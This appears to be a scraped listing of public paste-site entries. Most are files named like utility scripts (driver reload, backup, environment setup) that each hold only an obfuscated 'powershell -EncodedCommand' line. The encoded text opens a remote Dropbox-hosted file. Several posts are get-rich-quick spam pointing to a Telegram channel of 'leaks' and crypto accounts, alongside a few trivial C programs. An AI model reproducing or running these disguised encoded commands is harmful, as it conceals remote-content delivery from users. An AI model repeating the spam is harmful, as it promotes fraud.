id,title,username,language,date,content
PRw7GTNg,reload_drivers.cmd,wigosz,Batch,Tuesday 1st of July 2025 06:34:28 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9ADUAYQAzADQAMgBlAGYANwA=

D0Hs7"
ixqgHbnt,track_activity.bat,Sylveighty,Batch,Tuesday 1st of July 2025 06:34:18 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9AGMANQBjADYANABmADIAMAA=

99eCb"
EmLKmbCf,✅ MAKE $12OO IN 10 MIN U,glu3stiff,JavaScript,Tuesday 1st of July 2025 06:34:05 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/KSZgui
ACC 9233470
"
r5WR2beJ,Untitled,Josif_tepe,C,Tuesday 1st of July 2025 06:33:56 AM CDT,"#include <stdio.h>

int main() {

    int x, y;
    scanf(""%d%d"", &x, &y);
    
    int zbir = x + y;
    printf(""%d\n"", zbir);
    
    return 0;
}
"
t4k77a6X,Untitled,Josif_tepe,C++,Tuesday 1st of July 2025 06:27:51 AM CDT,"#include <stdio.h>

int main() {

    int x;
    scanf(""%d"", &x);
    
    printf(""%d\n"", x);
    
    
    return 0;
}
"
erZL6CSf,build_assets.ps1,wigosz,Batch,Tuesday 1st of July 2025 06:25:06 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9ADYAZgA2AGQAOAAwADEANgA=

0o9gs"
bCLFMVny,setup_env_vars.ps1,Tantan_07,Batch,Tuesday 1st of July 2025 06:24:49 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9AGEAZAAwADIAYgA2AGEAYQA=

VhkMM"
PVPa8Axh,run_backup.bat,Retrotv609,Batch,Tuesday 1st of July 2025 06:24:45 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9AGMAZQA1ADcAZgA2ADYAYQA=

B4Gk1"
rpanzQuR,MAKE $500 INSTANTLY Q,Super-epic,JavaScript,Tuesday 1st of July 2025 06:22:47 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/KSZgui
ACC 6115193
"
xZWDdFGc,backup_registry.ps1,totakeke,Batch,Tuesday 1st of July 2025 06:22:25 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9AGQAZAAyADUAOAAyAGQANQA=

eYpwf"
DmUJXWQM,Make $1200 in 15 minutes I,javierux20182021,JavaScript,Tuesday 1st of July 2025 06:22:23 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/KSZgui
ACC 5982012
"
eMgnN6Uu,Untitled,Josif_tepe,C,Tuesday 1st of July 2025 06:20:55 AM CDT,"#include <stdio.h>

int main() {

    printf(""Zdravo!\n"");
    
    
    return 0;
}
"
S73aV6V4,✅ Crypto Accounts 4,glu3stiff,JavaScript,Tuesday 1st of July 2025 06:20:38 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/KSZgui
ACC 7532804
"
ZQ8ebWA5,validate_schema.ps1,Tantan_07,Batch,Tuesday 1st of July 2025 06:20:12 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9AGEAYwBlADkAMwA0ADcAZQA=

8CFXs"
JeHuSEPb,shutdown_network.cmd,Tantan_07,Batch,Tuesday 1st of July 2025 06:14:47 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9AGUAYwBlADYANwBmAGEANAA=

pS2iA"
Qy4PLcgW,lockdown_system.bat,Retrotv609,Batch,Tuesday 1st of July 2025 06:14:44 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9ADIAMgA1ADAAZgA5ADYAOAA=

e0Ert"
xbx7r5tb,init_environment.ps1,wigosz,Batch,Tuesday 1st of July 2025 06:14:33 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9AGIAYwAxADcANQBlADAAYgA=

tqEqY"
j0GsGFGS,update_repos.ps1,Tantan_07,Batch,Tuesday 1st of July 2025 06:10:11 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9AGYANABkADEAOAA3ADMAYgA=

fwrXY"
60wCLEqs,✅ MAKE $12OO IN 10 MIN T,Super-epic,JavaScript,Tuesday 1st of July 2025 06:09:23 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/KSZgui
ACC 1563601
"
CZXqR1ip,dataNone,TestGuy1,JSON,Tuesday 1st of July 2025 06:00:10 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'cbd37236924ad06eb41ca6d237c112a5339e8b8225b8e79b4ba5a034e60b4856b042f22693a57d1ec70cda75096b90019318373d45f5067570717ead56dd8ff6890d3137e6c60f04d17b0d61509692da5276d28da08ab17f228367f36db6e8406a85baca387a8070a72e26169a14d6fb5d98e1f3cc0e76786895e06af06ee440',
  otherdata: [
    '924e22ef3db5f8c819daf60b2fa32ff4',
    'fca85e60552f96e84b85bb5a18bdd5cf',
    '50bf76d8f6c2f64c59cf07d86398cfb6',
    '5a29e62bd057b4cf21d33923c93a258f',
    'f80f41965f1bb9f3217bf13ca5c77283',
    'c7654b9d761924c76c2809bbeb6f43b5',
    'b9f3389818b4075bf5195b0e33ce86d0',
    'befbc483648105a57567c4c3f3c6a846'
  ]
}"
DH7TYbkk,arseni231423's Anti Script Kid (Skid),arseni231422,Lua,Tuesday 1st of July 2025 05:57:30 AM CDT,require(110155818485783).AntiSkid()
